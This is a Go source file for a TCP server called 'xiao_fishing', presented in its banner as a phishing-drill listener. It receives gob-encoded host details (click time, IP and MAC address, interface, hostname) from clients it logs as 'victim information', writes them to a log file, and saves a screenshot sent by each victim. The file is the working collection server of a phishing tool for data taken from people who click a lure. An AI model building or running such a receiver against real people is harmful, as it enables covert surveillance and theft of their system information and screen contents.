package main

import (
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"time"
)

type NetworkInfo struct {
	Time        string
	IPv4Address string
	Interface   string
	Hostname    string
	MacAddress  string
}

func printBanner() {
	fmt.Println("========================================")
	fmt.Println("           xiao_fishing Server          ")
	fmt.Println("      Phishing Drill - Listening...     ")
	fmt.Println("             author:  A Xiao              ")
	fmt.Println("========================================")
}

func main() {
	// 打印banner信息
	printBanner()

	// 定义监听地址和端口
	address := "192.168.28.166:56600"

	// 创建 TCP 服务器
	listener, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()
	fmt.Println("Server started. Listening on", address)

	// 循环接收客户端连接
	for {
		// 接收客户端连接
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			return
		}

		// 启动处理客户端连接的 goroutine
		go handleClient(conn)
	}
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	// 创建一个解码器，用于解码客户端发送的数据
	decoder := gob.NewDecoder(conn)

	// 接收客户端发送的 NetworkInfo 结构体
	var infos []NetworkInfo
	err := decoder.Decode(&infos)
	if err != nil {
		fmt.Println("Error decoding:", err)
		return
	}

	// 保存接收到的信息到log日志文件
	file, err := os.OpenFile("access.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	for _, info := range infos {
		log := fmt.Sprintf("受害者信息：\n点击时间: %s\nIP地址: %s\nMac地址: %s\n网卡信息: %s\n主机名称: %s\n\n",
			info.Time, info.IPv4Address, info.MacAddress, info.Interface, info.Hostname)
		fmt.Println(log)
		if _, err := file.WriteString(log); err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	}

	// 接收并保存截图
	fileName := fmt.Sprintf("%s_%s_%s.png", infos[0].Hostname, infos[0].IPv4Address, time.Now().Format("20060102150405"))
	imgFile, err := os.Create(fileName)
	if err != nil {
		fmt.Println("Error creating image file:", err)
		return
	}
	defer imgFile.Close()

	// 接收图片数据并写入文件
	imgData := make([]byte, 1024*1024) // 假设图片最大为1MB
	n, err := conn.Read(imgData)
	if err != nil {
		fmt.Println("Error reading image:", err)
		return
	}

	// 保存图片
	imgFile.Write(imgData[:n])
	fmt.Println("Image saved:", fileName)
}
